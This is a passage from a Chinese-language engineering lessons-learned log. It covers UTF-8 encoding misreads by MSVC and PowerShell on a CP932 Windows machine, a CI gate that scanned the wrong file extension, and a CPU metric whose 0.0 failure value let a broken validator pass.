  不要在前一條分支上疊。前一條隨時可能被 squash 掉。

## K-004 — 同一個字集陷阱的第二次現身：PowerShell 讀 BOM-less `.ps1` 也用 ANSI codepage

- 日期：2026-08-03 | 來源：`CHG-20260803-05` 施工過程（工具鏈問題，未進 repo 的 scratchpad 腳本）

### 錯誤

驗收用的 PowerShell 腳本（UTF-8 無 BOM、含中文說明與輸出）執行時：
第一次是 `New-Object System.Drawing.Bitmap(...)` **回傳 null 卻不報錯**，
後續才在毫不相干的行號爆出 `Unexpected token` / `The string is missing the terminator`。
症狀看起來像是防毒攔截或 API 失敗，實際上兩者都不是。

### 根因

**與 K-001 完全同一個機制，只是換了個宿主。** PowerShell 5.1 讀取**沒有 BOM** 的 `.ps1`
檔案時，用的是「非 Unicode 程式的系統地區設定」那個 ANSI codepage（本機為 **CP932**），
不是 UTF-8。中文字的 UTF-8 位元組被誤判為雙位元組前導碼，吃掉字串的結尾引號 →
剖析從那一行開始錯位 → 後面的變數變成 `$null`、或在完全無關的位置報語法錯誤。

**為什麼特別難認**：錯誤位置與真正的壞行相距很遠，而且第一個症狀（`$bmp` 是 null）
根本不長得像編碼問題。很容易誤判成環境因素（防毒、權限、API 失敗）而往錯誤方向查。

### 解法

擇一：

1. **腳本寫成純 ASCII**（本次採用）——中文說明改放在對話 / 文件裡，不放進 `.ps1`。
2. 存檔時加 **UTF-8 BOM**，PowerShell 5.1 即會正確辨識。
3. 改用 PowerShell 7+（預設 UTF-8）。

### 可帶走的通則

- **「UTF-8 無 BOM + 非 UTF-8 系統地區設定」是這台機器上的系統性陷阱**，不是單一工具的毛病。
  已經在 **MSVC**（K-001）與 **PowerShell**（本條）各咬一次。
  往後任何吃檔案的工具都要先問：它預設用什麼編碼讀？
- **症狀離根因很遠時，先懷疑編碼。** 尤其當「錯誤行看起來完全正常」時。
- 排錯順序上，**先排除自己這一側的可能，再歸咎環境**（防毒、權限、網路）。
  本次一度往防毒方向猜，實際上跟防毒毫無關係。

## K-003 — 兩道「防線」同時空轉：契約測試沒測任何真實後端，守它的閘門掃錯副檔名

- 日期：2026-08-03 | 來源：`CHG-20260803-03` | 狀態：**兩者皆已修復**
  （閘門於 `CHG-20260803-03`；契約鴻溝於 `CHG-20260803-10`——修好當下即抓到 [[K-007]]）

### 錯誤

準備進相位 2 寫 win32 後端時，本要依 PHASE-PLAN 的承諾「契約測試不改一行拿去跑新後端」，
結果發現**做不到**，而且**沒有任何機制會告訴你做不到**。

### 根因

兩個獨立的問題，剛好互相掩護：

**① 契約測試測的是自己的 stub，不是任何真實後端。**
repo 裡有兩個同名但毫不相干的 `KernelBackend`：`ds::kernel::KernelBackend`（真實後端實作的那個，
具名 `SurfaceId` + `bool` + `begin_frame`/`poll_input`）與 `ds::kernel::contract::KernelBackend`
（契約測試自帶的，`SurfaceHandle` 數字 handle + `Status` 三態 + `invoke_capability`）。
契約組**刻意不 link** null 後端以「維持單元獨立」，只測目錄內的 `StubBackend`。
它的註解寫「未來各後端加一個 factory 即納入」——但型別不相容，加不進去。

**② 守「契約測試不得分平台」的閘門掃 `tests/contract/**/*.py`，而契約測試是 C++。**
該目錄 `.py` 檔數為 **0**。這道檢查從上線起執行了無數次、次次綠燈，**一次都沒真正檢查過東西**。

單元獨立性（好意）換掉了契約的唯一用途；而唯一會抱怨的閘門正好瞎了。

### 解法

**已修**：閘門補上 C/C++ 掃描。關鍵設計——**只檢查前處理器指令行**（第一個非空白字元為 `#`），
不做全文比對。因為契約測試的註解本來就會寫「不得出現 `win32` / `cocoa`」，
全文比對會把自我約束的說明判成違規，逼人刪註解；而註解行永遠不以 `#` 開頭，天然免疫。

**未修**：契約與真實後端的型別鴻溝。需重寫 E1-25 或加轉接層，屬獨立的 medium 級工程。
在那之前，**任何後端都不得宣稱「通過契約測試」**——W1-01 的 acceptance 欄位已明文寫死這點。

### 可帶走的通則

- **一道從未紅過的閘門，和一道不存在的閘門，外觀完全相同。** 新增或修改檢查時，
  必須跑一次負向測試證明它會紅；只看到綠燈不代表它在工作。
- **檢查器要對得上被檢查物的實際形狀**（副檔名、路徑、語言）。
  `**/*.py` 掃一個 C++ 目錄，會安靜地永遠通過。
- **「單元獨立性」不能凌駕於元件存在的理由之上。** 契約測試不 link 任何真實後端以保持獨立，
  結果是它不再驗證任何東西。獨立性是手段，不是目的。
- 加檢查時順手問一句：**它在什麼情況下會紅？** 答不出具體情境，那就是還沒有這道檢查。

## K-002 — 用 `0.0` 當「取樣失敗」的代表值，讓壞掉的指標看起來像「很閒」，還騙過了驗收

- 日期：2026-08-03 | 來源：`CHG-20260803-02` | 環境：Windows / `examples/cpu_gpu_validator`

### 錯誤

驗證器在 Windows 上跑起來，畫面渲染完全正常，**CPU 量表 12 幀有 10 幀是 0.0%**——
而驗證器**自己印 `✓ PASS`、回 exit 0**。

### 根因

三層，一層比一層嚴重：

1. **`GetSystemTimes` 是差分式 API**，兩次取樣之間必須真的經過時間（系統時鐘約 15.6ms 一跳）。
   原迴圈幀與幀之間**完全沒有間隔**，差分恆為 0。
2. **失敗值與合法值撞號**：取樣失敗時回 `0.0`——但 `0.0` 是完全合法的 CPU%。
   於是「量表死掉」與「CPU 很閒」在呼叫端眼中**一模一樣**，無從分辨。
3. **驗收條件只檢查 `fill_ratio ∈ [0,1]`**，而 `0.0` 完美滿足。
   → 指標整輪死掉照樣 PASS。**這是會放行任何未來指標故障的假綠燈，比缺陷本身危險。**

附帶：同一函式的首次呼叫拿 `prev_* = 0` 去差分，算出的是「**開機至今的平均 CPU**」而非瞬時值，
且與它自己的註解（「首次呼叫回 0」）相反。它會印出一個看似合理的數字，因此比回 0 更難察覺。

### 解法

1. **失敗值不可與合法值撞號**：改回 `-1.0` 表示「這次取樣無效」。首次呼叫只建立基準點並回 `-1.0`。
2. 迴圈加取樣間隔 `std::this_thread::sleep_for(250ms)`（標準 C++，不引入平台分支；
   POSIX 的 `getloadavg` 無狀態、不受影響）。
3. **驗收拆成兩條**：①組裝（`fill_ratio ∈ [0,1]`）②取樣（有效樣本必須 12/12）。
   任一條紅 → `✗ FAIL` + exit 1。

### 可帶走的通則

- **不要用值域內的合法值當錯誤代表值。** `0`、`-1`、空字串只要落在合法值域，
  錯誤就會偽裝成正常資料流過所有下游檢查。
- **「範圍檢查」不等於「有效性檢查」。** `fill_ratio ∈ [0,1]` 對一個永遠回 0 的死指標永遠成立。
  驗收條件要問「這個值是不是活的」，不是只問「這個值格式對不對」。
- **新加的驗收條件要跑一次負向測試。** 本案把取樣間隔暫時改 0 重跑，確認條件②真的紅、
  且條件①在同一輪仍然全綠——沒跑這步的話，等於加了一條從未被證明會擋任何東西的規則。

## K-001 — MSVC 以系統 ANSI codepage 誤讀 UTF-8 原始碼，中文字串炸成 69 個編譯錯誤

- 日期：2026-08-03 | 來源：`CHG-20260803-01` | 環境：Windows 11 / MSVC 19.44 / VS Build Tools 2022 17.14

### 錯誤

Windows 首次 MSVC 全建，69 個編譯錯誤：

```
src\kernel\capability_matrix.cpp(20,26): error C2001: 常數中包含新行字元
engine\format\document.cpp(373,9):      error C2143: 語法錯誤: 遺漏 ')' (在 '}' 之前)
```

分佈：C2001 ×27、C2143 ×23、C2146 ×8、C2059 ×4、C2064 ×3、C1075 ×2、C2317 ×1、C2318 ×1。
出錯位置全部指向**含中文的字串字面值**那幾行，程式碼本身看起來完全正常。

### 根因

**不是程式碼問題，是原始碼字集問題。**

本庫原始碼一律 **UTF-8 無 BOM**，註解與字串大量含中文。MSVC 在**沒有 `/utf-8`** 時，
不會假設 UTF-8——它用「非 Unicode 程式的系統地區設定」那個 **ANSI codepage** 去解讀原始碼位元組
（該機為 **CP932**；zh-TW 機器則是 CP950，症狀相同）。

中文字的 UTF-8 位元組序列被誤判為雙位元組字元的**前導碼**，於是把緊接的位元組（包含字串的**結尾引號**）
一起吞掉 → 字串未收尾 → C2001「常數中包含新行字元」。其後的 C2143 / C2146 / C2059 / C1075 等
全是這個的**下游語法崩塌**，不是獨立問題——修掉字集，42 個下游錯誤一起消失。

**為什麼 CI 抓不到**：GCC 與 Clang 預設就以 UTF-8 解讀原始碼。此問題在 Linux / macOS 上
**結構上不可能出現**，而 CI 是 ubuntu + GCC。任何只靠 ubuntu CI 的專案都會在 Windows day-1 首建才撞到。

**為什麼不是「MSVC 比較嚴格」**：與 MSVC 版本、C++ 標準、程式邏輯都無關，
純粹取決於**那台 Windows 機器的系統地區設定**。同一份原始碼在系統地區設定為 UTF-8（beta 選項）的
Windows 上不會出錯——所以它還會**因機器而異**，更難重現。

### 解法

根 `CMakeLists.txt` 加 MSVC 專屬旗標，置於所有 `add_subdirectory()` 之前：

```cmake
if(MSVC)
  add_compile_options(/utf-8)
endif()
```

`/utf-8` 同時把**來源字集**與**執行字集**設為 UTF-8。套用後全建 **0 error、0 warning**，
ctest **176/176 Passed**。

要點：

- **必須用 `if(MSVC)` 包住**。`/utf-8` 是 MSVC 專屬旗標，GCC / Clang 收到會報錯。包住之後
  ubuntu CI 行為與修正前完全相同。
- **位置要夠前面**。`add_compile_options()` 是目錄範圍、只影響**其後**加入的子目錄，
  放在 `add_subdirectory()` 迴圈之後會完全沒效果。
- 不要改用「幫原始碼加 BOM」的解法。那要動 1000 多個檔，且與 `scope_check` 的 write_scope 紀律衝突。
- 別被錯誤數量誤導去逐檔改程式。**69 個錯誤是 1 個根因**；先確認錯誤是否集中在含非 ASCII 字元的行。

### 未關閉的缺口

ubuntu CI **驗證不到這個修正**（GCC 本來就過），故此修正目前只有本機證據。
要讓「Windows 編不編得過」真正進入閘門，必須在 `governance.yml` 加 **windows runner** 跑 MSVC 全建
（`docs/backlog/phase2-desktop-runtime.md` §6 checklist 步驟 3）。**在那之前，這個坑隨時可能以別的形式重開。**
